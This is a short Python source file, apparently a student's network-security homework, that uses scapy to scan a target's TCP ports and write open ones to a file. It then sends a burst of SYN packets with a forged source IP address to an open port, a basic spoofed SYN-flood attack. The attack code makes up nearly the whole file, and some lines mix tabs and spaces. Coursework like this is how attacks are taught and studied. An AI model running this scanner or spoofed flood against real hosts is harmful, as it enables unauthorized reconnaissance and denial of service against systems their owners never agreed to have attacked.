# Samodya Abeysiriwardane
# HW 08
# SYN

from scapy.all import *
import socket
import sys

class TcpAttack:
    ATTACK_LENGTH = 10
    def __init__(self, spoof_ip, target_ip):
        self.spoof_ip = spoof_ip
        self.target_ip = target_ip

        # IP packet with only target ip
        # this is used for port check becuase we must receive the reply
        self.ip = IP(dst=target_ip)

        # IP packet target_ip and spoofed_ip
        self.spoofed_ip = IP(src=spoof_ip, dst=target_ip)

    @staticmethod
    def checkOpenPort(ip_packet, port):
	srcport = RandShort()
        p = sr1(ip_packet/TCP(sport=srcport, dport=port, flags='S', seq=40), verbose=0, timeout=4)
        if p and p.getlayer(TCP).flags == 0x12: # Got SYN+ACK
            return True # Open port
        else:
            return False #Closed port

    def scanTarget(self, range_start, range_end):
        fout = open('openports.txt', 'w')
        for i in xrange(range_start, range_end+1):
            if TcpAttack.checkOpenPort(self.ip, i):
                fout.write("%d\n" % (i,))
        fout.close()

    def attackTarget(self, port):
        if TcpAttack.checkOpenPort(self.ip, port):
	    for i in xrange(0, TcpAttack.ATTACK_LENGTH):
               p = self.spoofed_ip/TCP(sport=RandShort(), dport=port, flags='S', seq=40)
               ans = sr1(p, timeout=1)
            return 1
        else:
            return 0
